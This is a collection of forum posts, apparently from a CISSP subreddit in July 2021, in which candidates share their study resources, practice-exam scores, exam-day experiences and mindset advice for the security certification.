I am studying for the last 3 months. Making a study plan a day prior, checking if I can spend some time the following day studying for the exam. I am not over-stretching myself. Where-ever I see, read - on youtube, blogs, forums - there is a lot of fear mongering around the exam. The same kind as we had during high school exams, college exams, university exams and the freshers company placements exams. What happened - we did not learn anything by choice but by fear. What such fear mongering does is lowers our morale and we start considering this exam as our worth decider. 

I am just writing this post - to give a perspective - that this is just an exam! And especially designed for professionals - who work 8-10 hours a day, have other Misc. work, life crisis, relationships and in summary are adults with a whole lot of responsibilities. 

If you read this post, do study for the exam at your own pace, give your own best (don't read others opinion how tough the exam is) and then in the end it is just a result (Pass or Fail). No exam can value the minimum of 5 years of experience we all have in the Information Security Field. 

The exam is worth it for sure, to learn and test our knowledge but the kind of fearful stature we give to this exam should be stopped - we are adults and not students. We have experienced life and we know it will be Okay!

2939,or002m,Obligatory “provisionally passed” post,"Full disclosure: I earned a CISSP cert around 2003-04 that I held for 6 years and then let lapse. I wasn’t in a security-focused role in the job I’ve held for the last 16 years, and keeping up the CEUs wasn’t worth it. That being said, the CBK and the exam - as well as the industry in general - are radically different than they were then and I’ve never been in a “traditional” security role. My earlier test was the 6 hour paper exam on 10 domains that had very little overlap unlike the current 8. 

Prep: 1 month, OSG 8th edition, sample test companion book, ITPro.tv subscription (accelerated 2018 version, 2021 came out just before my test), mind map and exam cram YouTube series. I also credit Harry Lorayne and Josh Foer for the memory techniques that I made extensive use of in my studies.

If I had to prep over again I would’ve done the mind map series first before starting ITProTV and OSG. It would’ve given me a better 360 and a place to hang the specific concepts as I picked up more detail.

The adaptive testing is no joke. I honestly had no idea how well I was doing, or whether I was going to pass or fail when I got my results. I had no idea which questions were evaluated, and TBH was often not sure whether I knew the answer or not. I would have probably dreaded my results and felt like giving up if I hadn’t seen [this video](https://youtu.be/5nqqL1rjIY4). If you’re used to acing paper exams this will feel awful. I had to remind myself many times not to take ANYTHING too harshly in my mind.

I couldn't be happier, I've prepped for almost 2 years.

&#x200B;

Top advice, spend as much time as you can in the [Certification Station](https://discord.gg/certstation) Discord channel. There you will find both what's the proper material, and relevant and authoritative discussions about the different topics.

I've compiled which sources I used in this [LinkedIn post](https://www.linkedin.com/posts/lucianovaschetti_today-i-defeated-the-beast-after-100-activity-6823330484798423040-ox-X)

&#x200B;

Although it's a Manager exam, it evaluates technical content, so you have to be comfortable with the vocabulary and how the technology works. That said, technology is not the most important to be evaluated.

As I've been told, there are really weird questions (although related, of course)

New topics come up, but being aware of them and knowing the inch deep is enough.

It's not worth memorizing anything (and I didn't), but understanding and being able to talk about the major processes (BCP, BIA, DRP, IR, SDLC)

Time wasn't an issue with the exam. On the contrary, 100 minutes were left, even without rushing into any question. Taking a few breaks to go to the bathroom and drinking water was really helpful.

The last days I relaxed and took walks while listening to Rob Witcher's mindmaps, and listening to different mindset videos on Youtube (Kelly, Larry, Seth Misenar / Eric Conrad)

&#x200B;

These videos helped me a lot, to be in the ""Think like a Manager"" mindset, I watched them several times:

[https://www.youtube.com/watch?v=v2Y6Zog8h2A](https://www.youtube.com/watch?v=v2Y6Zog8h2A)

[https://www.youtube.com/watch?v=dq5eodSz\_0k](https://www.youtube.com/watch?v=dq5eodSz_0k)

&#x200B;

Something really helpful was to print the Exam Essentials from OSG 9, and reviewed them all, marking and putting comments to anything I wasn't sure about.

So, covering 100% of the topics (without memorizing anything like cable speeds) + a good mindset = being comfortable at the exam room.

Also, before entering the exam room, I took 5 minutes for myself and breathed with my eyes closed, listening to this one: [https://www.youtube.com/watch?v=AtF0T2fPvbI](https://www.youtube.com/watch?v=AtF0T2fPvbI)

&#x200B;

As for the questions in the exam:

\- Some of them were really direct /easy/straightforward (e.g. ""what's best for accomplishing ***this***). These ones would be like Boson.

\- Some of them were hard, in the sense that the purpose was hidden (they used other words different than the ones we're used to (e.g: Privacy instead of Confidentiality). These ones would be like Thor's

\- Some of them were really weird (assume most of that ones were non-graded) and I'd tried my best. These ones would be like Wentz's

I think there were 1/3 of each of those groups. Really, some of them weren't that hard

But.. for the first group, I had a (simple) networking question, or access control model questions, that if I didn't know the knowledge couldn't have answered.

My main takeaway is: The most productive parts of my journey were a tight feedback loop of practice exams, identifying weak points, studying, and repeat. 

# Before CISSP

I have \~9 years of IT/technical experience, 4+ of which was a wide-spread role containing cybersecurity, IR, limited forensics, DLP, and security tool administration. The last 9-10 months have been as a Cloud Security Architect. All of this has been at the same organization, a Fortune 100 enterprise.

Previously I've obtained the following certifications that the studying of helped (at least in part) for the CISSP:

* Security+
* SANS GCIH
* CEH (Masters)
* Cloud+
* AWS Certified Cloud Practitioner
* AZ-900
* AZ-104

In addition I took the OSCP class, and worked some of the labs, but did not attempt the exam. Retaking the class and reattempting the exam is a 2022 or 2023 goal for me.

# Studying for the CISSP

I began with the 11th hour. I guess it was nice, but it felt way too high level. I know a lot of people say this is a great last-minute prep, but I really can't agree with that. It was so high level and detail-lacking I can't really see the value. I guess it was a nice first pass? In hindsight, the [CISSP Mindmap video](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) series would have been a much better first pass. Note, I didn't study the 11th hour, just read through it once.

I also listened through, twice (just because it was long-car-trip material) the [Essential CISSP by Phil Martin, Second Edition](https://www.amazon.com/Essential-CISSP-Exam-Guide-Knowledge/dp/B07JDJV47Z). I thought it did a decent job, and if you would like to study during car trips, it's the best audio book I found. I tried some others, but I wouldn't recommend them.

Next I went through a period of practice exam, official study guide, rinse, repeat. The first practice exam I took was the OSG's companion exam, then my three worst chapters in the OSG, then BOSON A, then the half-dozen worst chapters in the OSG (which did see some overlap), then BOSON B, the worst 3 chapters *and* the OSG's domain exams over the three worse domains, then BOSON C. I made notes along the way and reviewed the notes. I did all BOSON exams in ""study mode"" and if I missed the question I would screenshot the relevant parts of the explanation and added it to my study material. For the OSG practice exams, I would review the missed questions and also produce notes from them. All of my notes I went over at least twice, sometimes as many as six times. This being said by the time I had finished this, half of the OSG hadn't been touched, and I did not exhaust either the OSG practice exams (or close to it) or the BOSON exams. However the exams were different, so I would recommend both.

As a small aside, all of my study material was for the previous version of the CISSP. I did not feel like this left me ill prepared for the new version to any extent whatsoever.

Another small aside, I did watch a hodgepodge of videos on YouTube to focus in on any topic I felt uncomfortable with. My total time watching such videos was <6 hours, including repeating videos.

I also watched ""[Why you WILL pass the CISSP](https://youtu.be/-99b1YUFx0A)"" and read through [How To Think Like a Manager](https://www.amazon.com/Think-Like-Manager-CISSP-Exam/dp/1735085197/ref=sr_1_3?dchild=1&keywords=Think+like+a+manager&qid=1626967662&sr=8-3) during the weekend before my exam. I think they were both important, and added value. *However* I feel like the mindsets pushed in these study materials--*while valuable in the real world*\--weren't as important to the CISSP as they made it out to be. Still, do yourself a service and go through both of them.

Near the end of my preparations, I noticed I would read a practice question, and be able to *sometimes* articulate why two different answers were correct. Not in a ""these are both good answers, but I need to pick the best of the two,"" sort of way, but as a critique of the question author sort of way; I could display a deeper understanding that showed I understood the question; I was able to articulate an important security or business consideration that made it easy to justify multiple answers without more information. Thankfully on the actual exam I only came across one quesiton where I felt like I needed more information.

This level of understanding was probably the best sign I had that I was ready for the CISSP.

I was willing to accept if I picked a wrong answer in BOSON, the OSG exams, or Think Like a Manager, but about 1/3 - 1/5 of the time when I got a wrong answer I felt like I had a valid critique of the question, I would count myself as having gotten that question right. To that end, I was scoring about 85% on my last BOSON exam (first time taking the exam, I never repeated BOSON exams) and \~75% on my OSG ""trouble domains"" (domains where I was needing the most studying).

Lastly I will say please avoid the ""Inside Cloud and Security"" CISSP exam cram. I really hate saying this since his videos are engaging, clear, and generally well explained, however they suffer in three key ways. First what he decides to talk about feels like a patchwork of topics within the domain--or at least that's my view after having studied the domains--rather than a complete picture. Second, he often skips pass topics with a quick definition that really aren't valuable to you during the exam without actually understanding the topic, so it might give a false sense of readiness. Third, and most importantly, some things he says are outright wrong, which is dangerous for the exam. It felt like he got things that were more academic and less practical wrong, which makes sense given that he admits he did very little studying and depended on his extensive industry experience. 

# Final Thoughts/Summary

So the biggest reason I typed all of this up is to provide some context as to how to slam dunk the exam, and when you probably will slam dunk the exam. It also seems people are very hesitant in saying what % of practice exams will see that you pass, so here's my guide:

You're certainly ready to take the exam:

* When you're getting 80%+ on BOSON *from understanding the questions and not rote memorization.*
* When you're getting 75%+ on the OSG comprehensive exams *from understanding the questions and not rote memorization.*
* When you're getting 70%+ on the OSG domain-specific exams for your weakest trouble areas *from understanding the questions and not rote memorization.*
* After you go through the provided ""Think Like a Manager"" materials
* You have gone through all of the questions you missed, understand why you missed them, and spent time understanding accompanying material (if you miss a question about why a certain encryption technology is a bad choice in a specific situation, and another is a good choice, study both technologies in a broader sense, and loop in a third, forth, etc, technology that might be comparable)

This was where I was at, and, again, I was more than ready for the exam. Actually during the exam do basic good test taking skills such as ""carefully read the question, make sure you understand it, eliminate two answers,"" etc.

Also I will say the OSG exam *and* BOSON had questions that were grossly in the weeds such as ""you need to network two devices over X distance and you need Y speed. What Ethernet cable would you need?"" or ""A user is currently using 802.11(whatever). They want to upgrade to X speed. What 802.11 technology would your recommend?"" 

Do NOT worry about memorizing any tables of raw numbers like these. I saw NOTHING on the exam that was that in-the-weeds. Plenty of technical or semi-technical questions, but no rote memorization of numbers. In real life this is something you can certainly look up, or you deal with so regularly that you'll learn it as a matter of course.

I'd be happy to answer any questions that I can that respect the CISSP NDA.",2021-07-22

Started 4 weeks ago using the following:

**Study Materials**

* [Sunflower CISSP Summary](https://docs.wixstatic.com/ugd/dc6afa_fc8dba86e57a4f3cb9aaf66aff6f9d22.pdf) by Maarten de Frankrijker
* CISSP Exam Cram by [Inside Cloud and Security](https://www.youtube.com/channel/UCAr0yk0um7lwLjmrKfzwyig)
* [Destination Certification](https://www.youtube.com/channel/UCXk6whiDrWq42y9Tdv1MEhg) summary videos
* Google

CISSP Exam Cram came first, and after finishing all 8 domains and doing a few questions, I watched Destination Certification videos as a refresher. Sunflower CISSP Summary was mostly used as reference material, alongside Google.

**Practice**

* CISSPrep

Comparing the style, CISSPrep questions were very similar to the questions I got during the certification tests. Its pretty affordable as well. Some questions there are worded poorly, or have bugged options (especially for the drag and drop, somehow it doesn't record your selections properly), and some questions that I got wrong were not very well explained by them. However, it did a proper job in training me to focus on what's important when reading and answering questions (think like a manager).

I would say that results for practice tests don't really matter (unless you're getting below 40-50%), what's important is what you get from it. I was scoring 60-65% on the CISSPrep mock exams the day before the test.

**Pre-Test/Pre-Practice**

*  [CISSP Testing Tips Secrets All Students Should Know](https://www.youtube.com/watch?v=CanT50bzEV0) by Andrew Ramdayal
*  [Why you will pass the CISSP](https://www.youtube.com/watch?v=v2Y6Zog8h2A) by Kelly Handerhan

Having little work experience, these 2 videos were vital in getting me into the correct mindset when doing practice questions, and sitting for the test. Watch them once before doing practice tests, and as many times as you want before you sit for the test, I feel it really helps.

**The Test**

It wasn't as hard as I expected it to be. Questions were pretty clear in explaining scenarios, just make sure to read carefully and read all the options. Many times I changed my answer at the last minute after realizing I read the question/options wrong or too quickly.

It was a wild 4 weeks for me with many lows, and not many highs, and I wish whoever who is preparing for their upcoming test all the best. Make sure to get enough rest the day before, and eat well (but not too well) to last the entire duration of the test.",2021-07-22
2948,opked7,CISSP Experience,"This forum helped me quite a bit and hence thought to update my experience for the benefit of the community and offer credit to the immense learning resources on the web

About me: Over 10 years in IT / Risk / Cyber.  

**Prep:** About 3 months, initially about 1 hour / day followed by 3-5 hours of revision in the last 2 weeks.

The following resources help strengthen my concepts (A big thanks to all of them):

· Thor Teaches

· Kelly videos

· Official study guide and practice questions

· CISSP mind maps on YouTube ([https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s](https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s))

· Reddit and ISC forum

· Reviewed the ISC practice questions once but did not attempt any more practice exams since I ran out of time. 

**Exam experience:**

Like most of the commentators before me mentioned, the questions were not straight forward, and I had no clue if the answer was correct. In fact, I tried looking up the answers to some of the questions I recalled at home but struggled even with Google! Some domains had more questions than others. I planned to take a break after 100 questions, but the exam ended on the 100th question with 1hour to spare. I did not look at my transcript until I was out of the centre  and was pleased to have provisionally passed. 

**Top Tips:**

Read the question and identity key words such as “Which solution”, “What comes first” etc. This should help filter out some of the answers. 

There is a lot of material out there and found additional value in each of them. Since the scope of CISSP is huge you will need to refer multiple sources.

If I had to prepare again, I would try to cover as many topics as possible and answer the following question with 1-line answers. What, Why and How. I don’t think it is necessary to go in depth and unnecessary details. Focus on concepts and understand why some of the technologies actually exist, their vulnerabilities and remediation. Use practice tests to re-in force these concepts and not as a barometer of your performance in the exam.   

Hope this helps :)",2021-07-22
2949,oph7oz,How do you complete your continuing ed credits?,"I am a fairly new CISSP and I am starting my continuing education credits now. So far I have done some express learning on the ISC2 website as well as some BrightTalk videos.

2950,ooy5bj,My CISSP journey from zero to passing with some obstacles," **My CISSP journey:**

I started studying at the beginning of 2019, inspired by some posts on reddit and the fact that the content of CISSP is very interesting for me and my further career steps. I spent about 3 months reading the Official Study Guide (OSG), researching a lot of content and taking lots of notes, and in the meantime, I was very confident that I would pass the exam.

However, in the middle of 2019, I stopped studying because I got an interesting job offer in security that required a bit more attention. So I decided to take a break and catch up on the OSG sections from time to time. 

In early 2020, I met a work colleague who has already passed the CISSP exam, he gave me some tips on good sources to continue with my studies. Later I will give a brief overview of the sources that helped me. I started studying seriously for a second time. This time with Thor and Kelly while I was driving. In the evenings I read the OSG and the latest Sunflower PDF to have a lot of information in a condensed form. Later in the year I ordered the Boson question bank and the OSG practice exam to practice some questions. In the beginning, I regularly scored 75% and reread my weak topics.

I booked my first exam in Germany, Düsseldorf for December 2020, due to Corona the test center was closed. The next possible date for the exam was in February 2021, this date was also cancelled. The next test date was then in April 2021. If I didn't pass the exam on that date or the test was cancelled again, then I would have to learn the new content because of the content update in 2021. And it happened again, the exam was cancelled again. Now it was clear I had to understand and be able to apply the new content, by 11 July. 

The last weeks before the exam I studied after work in the evenings for about 3+ hours, plus all the weekends. The day before the exam I thought I was ready to take it, but as soon as I saw the first 10 questions, I thought what the hell, I never read about this content. Halfway through, I wasn't very confident that I could pass the exam, but I focused on each question. When I finished the last question, I went to the reception and got my result - **Congratulations!** 

I passed, the CISSP exam.

**The study resources I used to prepare:**

**Cybrary Kelly Henderson:** I like her video training, she is very funny, knowledgeable and a great educator. You get a good and deep overview in her videos, which is easy to understand even as a non-native speaker. A must watch is her video on YouTube ""Why you will pass the CISSP"". 

**Thor Theache's CISSP:** I have seen a few write-ups saying that his content is not very good. But I disagree, his content is a bit expensive but worth watching. He is also a good trainer and sometimes he is available in the discord channel of certification station.

**CISSP for dummies:** I ordered this book and never read a complete chapter. Sometimes I had to re-read some content to get a second or third view of the content. 

**(ISC)2 Official Study Guide - latest version in 2020:** my main study resource, I read this book cover to cover, word for word. It is a good resource to get a good overview of the content, which is really a mile wide and a inch deep. At times I thought it was 1.61 km wide and 2.54 cm deep 😉. But if you ask me if you can pass with just the OSG, I will say, yes, it is possible, but you should take some time to read some other books as well.

**Eleventh Hour CISSP:** I got this book to get a quick overview of all the content that might be necessary in the last week. In hindsight, I would have read this first before going through the official study guide. It gives a good overview of everything to expect in the exam.

**(ISC)2 Official Practice Exam:** You should use the online version of the book, this is more helpful than the paperback. You will need to use the code you get from the paperback to register for the online test bank.

**Boson CISSP Practice Exam:** A lot of questions for a good price, updated regularly. You will need Windows to work with Boson. The questions are very technical and the answers are very well explained so you understand why the questions are wrong. This is a ready important aspect from my point of view.

**Certification Station Discord:** The CISSP channel is absolutely worthwhile. A very good resource that I would recommend anyone to join. Ultimate bunch of helpful people, open 24/7 (because of the international audience). Discussions on various topics have helped me a lot

**Destination Certification Flash Cards:** If you are on a train ride, journey or similar, take these flash cards and just read them one by one. Very helpful in my eyes. I would read them in the middle of my exam preparation.

**Do's and Don'ts:**

\- Register as soon as possible. The examination center in Germany, Düsseldorf is always fully booked at short notice.

\- I have done 4000+ questions.

\- Read correct AND incorrect answers of the question

\- Read the question twice during the exam

\- Do not give up during the exam, even if it looks bad

\- Be a member of a study group (Certification Station)

\- Eat well and do some exercises to have a fresh mind.

My last words, ""Don't talk the talk, walk the walk"" and all the best. I will now rest for a few weeks and then continue with CISA or CISM.",2021-07-21
2951,oox09n,Provisionally pased CISSP 150 w/ minutes left,"I failed november 2019 I was devestated, but when I jumped into the exam I got blindsided and it felt like I got run over by a truck.

2021Going into the exam I was much more well prepared, but I knew I had weaknesses. I felt like I could pass anyways.

April-May

Took CISSP SANS Course with David Miller. Loved the course, but wasn't crazy about Miller. There were something he said, that he was so confident in, that I found that were either wrong, or poorly said. He also talked really fast without a quick break. I imagine this might be because of online teaching, but maybe go with one of the course creators. For example, we got hung up on the terminology On-premise, on-prem or on-premises and what the exam would use.

Not to drive into it, but that isn't important, lets discuss the topics, not that on-premise is not correct terminology when talking to IT personel, and at the end of the day, no one cares. However, David Miller was really good diving into the technical points and bringing it all together. If you don't mind some of the small banter, and fast speaking, then go this route.

I would recommend the course, but be weary, everyone is different, and I really believe teachers should be suited to the student.

&#x200B;

SANS then provided Audio w/ Eric Conrad. I used this whenever I could.  A lot of story telling, but when it would drive into the points it was good.

I used Eric Conrads books, which were great. Really helped me drive some points.

Coffee shot videos 9/10, they really put things together for me, on how to answer and review CISSP questions

Luke Ahmeds book 10/10 was the BIGGEST help after the full study.

**Practice Tests:**  


**Cisspprep** 100% need this, you'll get mad at yourself but do it. Thank me later  
**Sybex Wiley** Do this about 6-4 weeks prior to your test. Then a few weeks before do ALL the questions you got wrong, study those topics that you keep getting wrong  
**PocketPrep** 7/10 Its good for on the go and helps reinforce concepts that you know but KISS

2952,oonpos,Passed yesterday with 100 questions,"So glade to have this done. Been in IT for a while and never got any certs. In the year, I got A+, Net+, Sec+ and now CISSP, which is way harder than any of the others. I took this exam back in May and failed the first time. So, after this I change my study method, which was just go through the Official guide a few times. 

Although I don't like bootcamps, I did attend one by Technical Institute of America, with Andrew Ramdayal. He is a very good instructor and I used his udemy to pass the sec+ a few months ago. His course really helped me understand the mindset of the question and topics. I then got the new official guide that came out last month made tons of notes. I only used CCCure questions and the the ones from the study guide. 

I think what made the difference is the way you approach the questions. Coming from sec+, you are more direct and this exam is not. Sec+ was always 1 correct choice, this exam some of them had what I taught is 4 correct choice. Andrew Ramdayal, larry greenblatt, and Kelly has the tips you need to pass the exam on youtube. Check them out. Trust me when I say this exam is more of how to select the correct answer than it is about knowing your stuff.  

You guys can can pass easily if you apply the right mindset. DO NOT go into the testing room without the right mindset or you will fail. This exam is very different than any of the 3 comptia certs I did. Thanks to everyone in this sub to help point me in the right direction after failing and losing $700.",2021-07-21

2957,oo5siy,Today was the day......,"Today was the day that I skipped like a schoolgirl, air punching, and yelling around a parking lot for 10 minutes…. Yes, it happened. Okay, what you’re here for.

After a little over 2 hours (I think), I have concurred this thing… I have roughly 9 years of experience in the field, with various certifications (CASP+, SEC+, A+, and CCNA). I am also pursing an MS-Info Science – Info Assurance.

Length of preparation for me was two months and some change… I chose to utilize my summer break from Grad school to prepare for this exam… and it worked out! Not itemizing hours, or questions, or pages, or any ""quantifiable things"" as everyone is different, and everyone takes in information at different speeds.... but here's what I have for you!

My piece(s) of advice:

1. Why do you want this thing? It’s not a “fun” process…. If you do not have a solid reason to dedicate yourself for however long you identify you need to prepare… it might not happen… I’ve creeped this thread, messaged many, and it’s happened, yes…however the odds are not likely. Know why you want to be a CISSP, and let that drive you to studying and preparing to test!
2. Mentally prepare yourself to sit there for 150 questions, when my test went past 100… I immediately got down on myself based off peoples comments of the 100q pass…. This took me a minute to take a deep breath, and get back into it… so just prepare yourself mentally you’re in it for the long haul! After all, a pass is a pass…..
3. Full dedication to the process. As mentioned I chose to use my summer break for this certification. My commute to work was not filled with music, it was filled with downloaded videos (mentioned below), via YouTube premium (FREE for one month, do this!) every single day for the duration of my preparation. My evenings were not filled with having beers with buddies, or watching movies with the wife and dogs…. It was spent in our office, reading, watching, listening, writing….. This thing is its own beast, and requires your mental and physical dedication…. Know that before you start this process!
4. Relax, breath, think…. That’s what my scratch pad said…. When I hit a question that went from an easier type question, to a short story…. I had to remind myself to relax, breath…. Which allows you to think.
5. Do not be afraid to fail. This is one thing I told myself starting this process, no matter what happens, I am bettering myself for doing this… I was not afraid to fail, what I was afraid of was of having to continue to study and retake this thing….wasting what I have left of my summer break… so don’t be afraid! After all, it’s a process, and participating in this process you will be shocked at how much you learn and grow!

Resources (what people seem to care about the most):

* Sybex OSG (8th Ed.):

\-Primary resource of reference/clarification for the entire process.

\-First pass, “read” cover to cover… took end of chapter tests, moved onto next chapter.

\-Emphasizing the “read” portion, as I did not read it word for word as some did….. Chapters I felt more comfortable with the material, I skim read and picked points within each chapter I had no idea what is was, and fully read that section.

\-Second pass, read the sections I scored lower than 75% on the end of chapter tests from start to finish, retook the tests.

* Sybex OSG Practice Tests (8th Ed.): Register your book online! Much easier and more convenient as you can access the tests with your phone, or tablet…. I DID NOT take all of these tests, as mentioned I did each chapter test in the manner above. For each practice test, the matter at which I took them, took each Domain test once, pending the score (e.g. below 75-80%) I would go back and review that domain, and then retake the questions I got wrong… to alleviate from memorizing answers.
* 11th Hour CISSP: After I read the massive Sybex OSG I needed more “light reading.” I read this book front to back, easy read…. Very high level overview of the topics. So stepping your mindset back a bit from the OSG source.

Videos:

* CybraryIT -  [Free Cybersecurity Training and Career Development | Cybrary](https://www.cybrary.it/) (free access if you only access a certain number of sources, not do check whatever I did about a ""premium offer""..they'll never stop calling you until you tell them to leave you the heck alone) – Kelly H’s videos… these were a great change of pacing getting out of a book, and questions. I DID NOT watch all of these….I watched her videos on topics I needed clarified, or explained in another way from my reading.
* Destination Certification Mindmaps -  [CISSP MindMaps / Domain Review - YouTube](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) : Wow, yes, I watched all of these…. And some of them multiple times for topics I just wasn’t grabbing onto….. 10/10 recommend this to help tie words together that may help you on the exam.
* Inside Cloud and Security -  [CISSP Exam Cram - YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) : Again, yes, I watched all of these…… And some of them multiple times (probably each of them at least twice). I used his 2021 topics videos to supplement the OSG version I used not having the most recent topics.
* Prabh Nair’s CISSP videos, and Coffee Shots -  [Prabh Nair - YouTube](https://www.youtube.com/channel/UCfZMpaSGpTa4JoqoZHCJBcw) : I incorporated these my final two weeks of study (by the point you’re either getting it or you’re not)… his videos were great! I also used his 2021 topics videos to supplement the OSG version I used not having the most recent topics. Tip for his videos, put the speed on .75x… he speaks rather quickly…. This helped my tremendously.
* Andrew Ramdayal CISSP videos -  [CISSP - YouTube](https://www.youtube.com/playlist?list=PLdC3YQR4lNFLHJh_lOd2QMovHjhEdTFjN) : I watched all of his videos once, particular one that stood out to me was his “Testing Tips” and “Practice Question” videos.

Questions:

* OSG Practice tests
* CISSprep.net: I was hesitant on buying this… just because I am cheap, and the mixed opinions… I personally enjoyed this platform, the questions were a headache, yes…grammar mistakes, some complained about not knowing single or multiple answer options…whatever, if you’re worried about that… you’re head is not in the right place. Pass the exam, make your own prep engine that is grammatically correct with explicit instructions of SELECT ONE....….(end rant on CISSprep). Scores ranging from 50-80%.... my overall average score was 65.8%.. I tracked my scores throughout the process... OCD, sometimes, more of a moral booster....
* Pocketprep App: This was an awesome resource for me because of convenience. Can be taken on your phone or table! Definitely helps nail down the factual items to build the conceptual knowledge you need.
* ISC2 Official Study App: Again, great resource due to convenience! Great supplemental method of doing questions to keep your mind on topics along with Pocketprep.
* rSlades blog post on ISC2: [Practice Questions - (ISC)² Community (isc2.org)](https://community.isc2.org/t5/Exams/Practice-Questions/td-p/18626?fbclid=IwAR138lfLPSzBL90njFDCi6Xe0j-wUXT7i1I4nw8iS3rs33HyV-P_tMlzU_0). These were awesome, another source of questions with explanations (sometimes collaboration from viewers)

Notecards:

*   I made note cards for basic topics, processes, procedures, and concepts I knew I needed to have in an instance… maybe 50-75 notecards total, I did them every day before work, and every night before bed….things such as: SDLC, BCP, DRP, BIA, SOC reports, Security Models, Incident Response, RMF, RAID, Backup Types/Benefits, SAML, ISC2 Cannons, Cryptography. More or less things I knew I needed to nail down, processes/steps, and random things I just always have a hard time committing to memory. 

Anyways, yeah…. I am humbled, overwhelmed, and gracious to join the ranks of fellow CISSPs! Thanks to all for continuously keeping this thread alive (daily), I lied in wait for a while taking notes on peoples prep methods, inputs, etc. and here I am! Thanks to all those on here I reached out to with questions/advice! Now I am going to enjoy the month I have left before back to the educational grind in the evenings!

Good luck!",2021-07-20

2960,onz36q,Passed (1 hour ago :D) 1st Try 100 Questions,"In the words of Colin Weaver ""Hey all you CISSP wanabees""

I just got back from my exam and all my thoughts are fresh in my mind so I thought I could share them with this group.

**My Background**

I've been in Cyber Security for just over 5 years. I work for a fortune 500. I'm a manager for a team that works on data security: DLP, DRM, Insider Threat.

**How I studied**

I started studying in late September or early October of last year. I went through the official study guide. I read through the entire book and took notes as I went. I used the online test bank that comes with the book and was going through. I was studying maybe 1 hour a day and usually 2-3h/day on weekends. Around Christmas I got burned out and then picked it back up around the end of January.

Then I went through the Destination Certification videos. I was getting about 80% on my Sybex practice exams and I felt good. Sybex also has online flashcards which helped too. At this point I was studying a minimum 2 hours per day. I went to book my exam and saw that the testing facility had filled up and I couldn't take my exam for another 2 months. (This pushed me into May and the updated course.)

With my extra time to study and to prepare for the updated course I watch Mike Chapple's Stuff on LinkedIn Learning. I'm not sure I would recommend the course, I can't remember a single topic I retained from his class. He did cover some topics for the new exam but he presented in a really dry way. I was watching at 1.25 speed the entire time. I also downloaded Anki, a flashcard program which was one of my best tools. Someone has uploaded some free practice questions that you can search for. I also just started adding terms and topics I needed to study harder. When I would go through an exam and get something wrong I would add that as a card. I have reviewed flashcards everyday since May.

With one last weekend before my exam, I bought some extra practice exams to study. I bought CISSP Exam Prep and the Udamy course. I took the Udamy exam and got a 40% three days before my exam date. Let's just say I was a bit concerned. I started taking the CISSP Exam Prep exams and I was getting 50%-60%. I freaked out and after some discussions with my fiancé decided to pay the $50 and reschedule for July.

I wanted to study seriously for the next two months with my extra time. I started by going through Kelly Handerhan's course. Her course was really good for what it covered but it doesn't cover all topics. Then I started going through the CISSP Exam Prep practice exams every other day. Then on the other day I would review other materials. I reviewed the Sybex book again. I read the 11th hour book (I wouldn't recommend it). I did IT Dojo Questions of the day, these were good when I was burned out from doing other things. I also studied my flashcard every day. At this point I was probably studying 2.5 hours everyday. I would also do Boson exams to get ready and identify gaps in my knowledge.

Yesterday, I reviewed my flashcards and then meditated a lot to calm my nerves. I watched Kelly Handerhan's why you will pass the CISSP exam. I had 3-4 questions where this video directly helped me.

**The Exam**

I expected the exam to be less technical than Boson and CISSP Exam Prep. It was. It was more straightforward knowledge based than I expected. I was expecting more experience questions but most of the questions were around a specific piece of information from the CBK. I kept hearing ‘think like a manager’, but I felt like there were more knowledge based questions. They weren't trying to trick you as much as I was expecting. I felt like I was very prepared with what I had learned and studied. Once I got into the exam it wasn't as bad as I was expecting. I felt okay about a lot of questions. In the last 10 questions, the questions got easier and I ended right at 100.

**What I recommend**

Reading the Sybex book was painful but had to be done. I think after that I would have done a visual refresher like Destination Certification. Using Boson and CISSP Exams, but using them to learn, not killing yourself on the score you get. You can't get a 40% and expect to pass but don't worry if you are getting a 66% vs a 70%. These exams are way more technical and complexly worded than the real exam. They help you prepare for the mindset of being able to pick apart a question. For example, if you see a question about control implementation, you better make sure you know if they want a preventive control, a detective control, an administrative control, or a technical control. That’s the mindset you need to have. Flashcards are a must for cementing topics in your head. I highly recommend Anki. I didn’t do a bootcamp but looking back I should have asked my company to buy me one. 

I don’t recommend the Udamy exam. It was overly confusing and just intentionally difficult. Some of the questions I was just mad at and would roll my eyes at why they said the answer I chose was wrong. 

Booking the exam well in advance is important. I didn’t realize that it would fill up. I checked once and they had openings every wednesday. Then I went to schedule my exam, and it was full for the next two months.

If I was doing it again, I think I could have shortened my study time, if I had done the practice exams earlier. I had relied a lot on the Sybex exams and thought those would be enough but they weren’t for me, they gave me a false sense of security. 

**Content Refresh**

I know a lot of people want to know how different the content is for the new exam. I do think I got a couple questions on new content but it was topics that I was familiar with through my work so it wasn’t very difficult.

**Overall**

Keep studying, keep working, keep your faith. Good luck everyone!",2021-07-20

2962,onxvll,Provisionnally passed @100 questions,"Hi,

Just wanted to share my feedback after passing provisionnally.

&#x200B;

**About me**

* About 10 years experience in IT Audit, GRC, CISO. Not really a tech guy.
* I registered 2 years ago, had zero motivation to study and rescheduled it. Then covid arrived and I had to reschedule two more times...

&#x200B;

**Preparation**

1. Eleventh Hour CISSP - I did not open at all the official guide, but I have read twice this smaller book. Very good starter for lazy people like me.
2. CISSP Official Practice Tests - Did all questions and looked on internet to understand when I was wrong. Resources I used the most.
3. PocketPrep (IT & Security) - Very good to test your knowledge with direct questions to use during transports. Not too technical and not too expensive. I did all questions.
4. Random website ([http://luc.desfosses.fr/CISSP/](http://luc.desfosses.fr/CISSP/)) - I do not remember where I found it, probably on reddit, but this has been a good summary of key concepts. I also wrote on paper the key concepts (OSI, ports, security models, SOC, BCP, ...).
5. 2021 Exam change - As I took a very long time to get the motivation to start studying, the content has changed in May so I looked to the changes on this website [https://www.cybervista.net/cissp-may-2021-exam-update/](https://www.cybervista.net/cissp-may-2021-exam-update/)

I hesitated a lot to buy Boson questions after reading this reddit, but I also looked at many feedbacks here saying that Boson questions were too technical compared to the exam so I did not buy. And to be honest I think that knowing more technical details would not have helped at all. At least I saved some money.

&#x200B;

**Exam**

* As most of people here I was not very confident that I would succeed during the test. I thought I would go to 150 questions but it ended at 100...
* You really need the high level view of what is used for what (concepts). You do not need to bother learning by heart every technical details of everything.
